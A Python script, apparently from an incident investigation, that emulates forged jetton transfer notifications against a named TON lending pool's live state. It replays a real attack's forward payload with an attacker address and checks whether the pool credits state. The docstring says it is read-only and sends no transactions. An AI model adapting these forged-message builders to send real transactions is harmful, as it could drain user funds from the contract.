#!/usr/bin/env python3
"""
Affluent BasicPool — local TVM emulation, WITH the real incident forward_payload.
READ-ONLY (lite-server reads + local TVM). No tx signed/sent.

Runs forged + honest-src notify variants and reports whether the pool's
storage (data) cell changes (i.e. whether the handler credits state).
"""
import base64, json, sys
from tonpy.types import LiteClient, Address, Cell, CellBuilder, VmDict
from tonpy.tvm import Emulator
from tonpy.autogen.block import Account, ShardAccount

POOL = "EQCrEHHG4Ff8TD3PzuH5tFSwHBD3zxeXaosz48jGLebwiiNx"
ATTACKER = "0:34461ba017e4799eeee0628521e505226ef405e087cabb765eb50a882e5550a2"
VAULT = "0:06b609ebd46d170e294651170e077a54865f8ba3ffc9f936893f42b87b2f1cb9"

def coins(b, v):
    if v == 0:
        b.store_uint(0, 4); return
    nb = (v.bit_length() + 7) // 8
    b.store_uint(nb, 4); b.store_uint(v, nb * 8)

def _data(acc):
    if acc is None or not hasattr(acc, "storage"): return None
    stt = acc.storage.state
    if not hasattr(stt, "x"): return None
    d = stt.x.data
    return None if d is None else getattr(d, "value", d)

def data_of_account(cell):
    return _data(Account().cell_unpack(cell, rec_unpack=True))

def data_of_shardaccount(cell):
    sa = ShardAccount().cell_unpack(cell, rec_unpack=True)
    return _data(sa.account if sa is not None else None)

def payload_cell_from_hex(h):
    return Cell(base64.b64encode(bytes.fromhex(h)).decode())

def build_notify(qid, amount, sender, fwd_cell):
    b = CellBuilder()
    b.store_uint(0x7362d09c, 32); b.store_uint(qid, 64); coins(b, amount)
    b.store_address(Address(sender))
    if fwd_cell is None:
        b.store_bool(False)
    else:
        b.store_bool(True); b.store_ref(fwd_cell)
    return b.end_cell()

def build_int_msg(src, dest, value_nano, body, lt, now):
    m = CellBuilder()
    m.store_bool(False); m.store_bool(True); m.store_bool(True); m.store_bool(False)
    m.store_address(Address(src)); m.store_address(Address(dest))
    coins(m, value_nano); m.store_bool(False); coins(m, 0); coins(m, 0)
    m.store_uint(lt, 64); m.store_uint(now, 32)
    m.store_bool(False); m.store_bool(True); m.store_ref(body)
    return m.end_cell()

def main():
    fp_hex = json.load(open("/tmp/opencode/aff/parsed_body.json"))["fp_hex"]
    fwd = payload_cell_from_hex(fp_hex)
    print("real forward payload cell hash:", fwd.get_hash(), "size", fwd.begin_parse().size_ext)

    lc = LiteClient(mode="roundrobin", timeout=3, num_try=5)
    blk = lc.get_masterchain_info_ext().last; now = lc.get_time()
    st = lc.get_account_state(Address(POOL), blk)
    lt = st.last_trans_lt + 1
    ss = st.to_shard_state()
    dbefore = data_of_account(ss.begin_parse().load_ref())
    hb = dbefore.get_hash()
    print("[live] pool lt", st.last_trans_lt, "seqno", blk.id.seqno, "data_before", hb)

    _, cfgraw = lc.get_config_all(blk)
    cfg = VmDict(32)
    for k, cs in cfgraw.get_iter():
        if k != 43: cfg.set(k, cs)

    # pool's own asset jetton wallet addresses (from tonapi jettons dump)
    try:
        j = json.load(open("/tmp/opencode/aff/jettons2.json"))
        wallets = {b["jetton"]["symbol"]: b["wallet_address"]["address"] for b in j["balances"]}
    except Exception as e:
        wallets = {}
    print("pool asset wallets:", wallets)

    TSTON_W = wallets.get("tsTON")
    runs = [
        ("att_fwd_1e12",   ATTACKER, ATTACKER, 10**12, fwd),
        ("att_fwd_1e18",   ATTACKER, ATTACKER, 10**18, fwd),
        ("att_nofwd_1e12", ATTACKER, ATTACKER, 10**12, None),
        ("vault_fwd_1e12", ATTACKER, VAULT,    10**12, fwd),
    ]
    if TSTON_W:
        runs += [
            ("srcwallet_att_1e12", TSTON_W, ATTACKER, 10**12, fwd),
            ("srcwallet_self_1e12", TSTON_W, TSTON_W, 10**12, fwd),
        ]
    res = {}
    for name, src, sender, amount, fwdc in runs:
        body = build_notify(1700000000000, amount, sender, fwdc)
        msg = build_int_msg(src, POOL, 1_500_000_000, body, lt, now)
        em = Emulator(cfg); em.set_ignore_chksig(True)
        try:
            ok = em.emulate_transaction(ss, msg, now, lt)
        except Exception as e:
            print(f"[{name}] ERR {e!r}"); res[name] = {"error": repr(e)}; continue
        after = em.account.to_cell()
        da = data_of_shardaccount(after)
        ha = da.get_hash() if da is not None else "None"
        changed = ha != hb
        print(f"[{name}] ok={ok} src={src[:10]} data_changed={changed} after={ha}")
        if da is not None:
            open(f"/tmp/opencode/aff/after2_{name}.boc", "wb").write(base64.b64decode(da.to_boc()))
        res[name] = {"ok": ok, "src": src, "sender": sender, "amount": amount,
                     "has_fwd": fwdc is not None, "data_changed": changed, "after": ha}
    json.dump({"before": hb, "runs": res}, open("/tmp/opencode/aff/emu_payload_results.json", "w"), indent=1)
    print("DONE")

if __name__ == "__main__":
    main()
